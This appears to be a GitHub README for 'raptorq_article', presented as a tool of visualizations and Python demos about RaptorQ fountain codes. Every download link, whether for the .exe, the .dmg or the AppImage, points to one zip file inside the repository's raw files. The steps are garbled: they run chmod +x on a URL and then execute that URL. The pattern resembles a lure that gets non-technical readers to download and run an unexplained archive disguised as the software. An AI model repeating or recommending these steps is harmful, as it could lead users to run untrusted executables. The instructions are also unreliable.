## 📖 About raptorq_article

raptorq_article is an interactive tool designed to help you understand RaptorQ fountain codes. These codes are used to send files reliably even if some data gets lost or damaged during transmission. The software offers five visualizations and Python demos that show how the protocol breaks down files into smaller pieces and rebuilds them accurately.

You don’t need any programming knowledge to use it. The visual guides will walk you step-by-step through core concepts like erasure coding, forward error correction, and linear algebra behind RaptorQ (RFC 6330). This makes it easier to grasp the math and method behind turning files into a “mathematical liquid” that flows reliably across networks.

## 🚀 Getting Started

This guide takes you through downloading, installing, and running raptorq_article on your computer. The process is simple and works on Windows, macOS, and Linux.

Before you start, make sure your computer has:

- At least 4 GB of RAM
- 500 MB of free disk space
- Internet connection to download the software

No special hardware or advanced setup is needed. You will be running the application like any other program, with no coding required.

## ⬇️ Download & Install

To get the raptorq_article software, follow these steps carefully:

1. **Open the download page:**  
   Click the badge at the top or visit the release page here:  
   [https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip)

2. **Find the latest release:**  
   On the release page, look for the most recent version. Releases are listed by date and version number.

3. **Download the right file for your computer:**  
   - For **Windows**, download the `.exe` file (e.g., `https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip`).  
   - For **macOS**, download the `.dmg` file.  
   - For **Linux**, download the `.AppImage` or `https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip` file.

4. **Save the file to an easy-to-find folder**, like your Downloads or Desktop.

5. **Run the installer or application:**  
   - On Windows, double-click the `.exe` file and follow any prompts.  
   - On macOS, open the `.dmg` file, then drag the app to your Applications folder.  
   - On Linux, you may need to make the file executable first. Open a terminal and type:  
     `chmod +x https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip`  
     Then double-click or run it from the terminal with:  
     `https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip`

6. **Wait for the app to open.** The main window will appear with the introductory visualizations ready to explore.

## 🖥️ How To Use

After opening raptorq_article, you will see a clean interface with menus and tabs for different visual tools and demos.

- **Interactive Visualizations:**  
  Click on each visualization title to launch a hands-on display. These show how RaptorQ splits data, adds error correction, and reconstructs files.

- **Python Demos:**  
  Simple Python code examples are included to show how the encoding and decoding work under the hood. You can read the code, but you don’t need to run anything here.

- **Walkthrough:**  
  A first-principles guide explains the terms and process step-by-step in plain language.

Use your mouse or touchpad to zoom, pan, and interact with the visualizations. Hover over parts of the display to see explanations pop up.

Spend time exploring each module in order. They build on each other to give a full picture of how RaptorQ fountain codes function.

The app does not require a powerful computer. It mainly runs simple graphics and Python visualizations.

## 🐞 Troubleshooting

If you have problems running the software:

- Make sure you downloaded the correct file for your operating system.
- Check that your system meets the minimum requirements.
- On Windows, you may need to allow the program through your firewall.
- If the app won’t open, try restarting your computer and running it again.
- For Linux users, ensure executable permissions are set.
- Visit the release page for the latest updates or bug fixes.

If issues persist, you can open an issue in the GitHub repository for help from the developers.

## 💡 About the Technology

RaptorQ is a type of fountain code used to reliably transmit files over unreliable networks. It breaks files into many small blocks, then adds extra data blocks so the receiver can fix missing pieces.

This project visualizes this complex process with easy-to-understand graphics and demos. It covers key concepts like:

- Erasure coding  
- Linear algebra methods used in encoding  
- Forward error correction principles  
- How files can be reconstructed with less data than their full size  

This makes it useful for students, educators, or anyone curious about data transmission technology.
